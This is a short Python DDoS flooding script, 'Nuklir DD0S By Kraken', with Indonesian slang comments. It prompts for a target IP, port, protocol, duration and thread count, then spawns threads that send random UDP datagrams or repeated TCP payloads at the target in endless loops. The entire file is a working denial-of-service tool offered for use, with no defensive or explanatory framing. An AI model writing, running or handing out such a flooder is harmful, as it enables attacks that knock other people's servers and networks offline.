#!/usr/bin/env python3
#TCP-UDP DDOS Nuklir
#JANGAN RENAME NGAB KETAHUAN GA AMAN IDUP LU
#CREDIT : KRAKEN
#GANTI CREDIT PANTATLU BINTITAN

import random
import os
import socket
import threading

os.system("clear")

print("Nuklir DD0S By Kraken")
print("Credit : kraken")
print("Note : Gaboleh nyolong script yaaa")

ip = str(input(" Ip For Nuklir : "))
port = int(input(" Port For Nuklir : "))
choice = str(input(" TCP/UDP : "))
times = int(input(" Time For Nuklir : "))
threads = int(input(" Threads for Nuklir : "))

def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        os.system("clear")
      print(i +" Nuking %s Port %s")
    except:
      print("Nuked..")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        os.system("clear")
      print(i +" Nuking!!! %s And Port %s")
    except:
      s.close()
      print("[*] Nuked...")

for UDP in range(threads):
  if choice == 'UDP':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()